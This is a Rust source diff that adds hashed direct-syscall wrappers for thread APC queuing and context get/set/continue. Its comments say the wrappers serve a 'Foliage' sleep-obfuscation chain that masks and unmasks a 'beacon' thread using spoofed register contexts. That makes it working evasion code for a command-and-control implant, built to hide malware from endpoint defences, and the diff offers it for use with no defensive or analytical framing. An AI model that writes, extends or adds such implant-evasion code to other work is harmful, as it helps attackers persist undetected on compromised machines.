@@ -663,6 +663,84 @@ pub unsafe fn nt_protect_virtual_memory(
     )
 }
 
+/// `NtQueueApcThread(ThreadHandle, ApcRoutine, ApcArgument1, ApcArgument2,
+/// ApcArgument3)` — 5 real args. Used by the Foliage chain to queue `NtContinue`
+/// APCs that walk the sleeping thread through its context dance.
+///
+/// # Safety
+/// `thread` must be a real thread handle with THREAD_SET_CONTEXT access.
+pub unsafe fn nt_queue_apc_thread(
+    rt: &Runtime,
+    thread: usize,
+    apc_routine: usize,
+    arg1: usize,
+    arg2: usize,
+    arg3: usize,
+) -> Option<i32> {
+    syscall5(
+        rt,
+        djb2(b"ntqueueapcthread"),
+        thread,
+        apc_routine,
+        arg1,
+        arg2,
+        arg3,
+    )
+}
+
+/// `NtContinue(ContextRecord, RaiseAlert)` — 2 real args. Restores a thread's
+/// register state from a CONTEXT struct. The Foliage chain queues APCs that
+/// each call NtContinue to install the next context in the mask→sleep→unmask
+/// dance. 2 args → padded into the 4-arg shim.
+///
+/// # Safety
+/// `ctx` must point at a valid, properly-aligned CONTEXT (1232 bytes on x64).
+pub unsafe fn nt_continue(rt: &Runtime, ctx: usize, raise_alert: u8) -> Option<i32> {
+    syscall4(rt, djb2(b"ntcontinue"), ctx, raise_alert as usize, 0, 0)
+}
+
+/// `NtGetContextThread(ThreadHandle, ContextRecord)` — 2 real args. Captures
+/// the current register state of `thread` into `ctx`. Used by Foliage to save
+/// the original CONTEXT before installing a spoofed one.
+///
+/// # Safety
+/// `ctx` must point at an aligned, writable CONTEXT buffer (1232 bytes on x64).
+pub unsafe fn nt_get_context_thread(rt: &Runtime, thread: usize, ctx: usize) -> Option<i32> {
+    syscall4(rt, djb2(b"ntgetcontextthread"), thread, ctx, 0, 0)
+}
+
+/// `NtSetContextThread(ThreadHandle, ContextRecord)` — 2 real args. Installs
+/// `ctx` as the register state of `thread`. Used by Foliage to set the spoofed
+/// CONTEXT (RIP = gap address) and later restore the original.
+///
+/// # Safety
+/// `ctx` must point at a valid CONTEXT. Modifying a running thread's RIP/RSP
+/// is inherently dangerous — only call when the thread is known-suspended or
+/// in a controlled APC window.
+pub unsafe fn nt_set_context_thread(rt: &Runtime, thread: usize, ctx: usize) -> Option<i32> {
+    syscall4(rt, djb2(b"ntsetcontextthread"), thread, ctx, 0, 0)
+}
+
+/// `NtOpenThread` — opens a handle to a thread by its TID + client ID. Used by
+/// Foliage to get a handle to the current (beacon) thread for APC queuing.
+/// 4 real args (ThreadHandle*, DesiredAccess, ObjectAttrs, ClientId*).
+pub unsafe fn nt_open_thread(
+    rt: &Runtime,
+    handle_out: usize,
+    desired_access: u32,
+    obj_attr: usize,
+    client_id: usize,
+) -> Option<i32> {
+    syscall4(
+        rt,
+        djb2(b"ntopenthread"),
+        handle_out,
+        desired_access as usize,
+        obj_attr,
+        client_id,
+    )
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
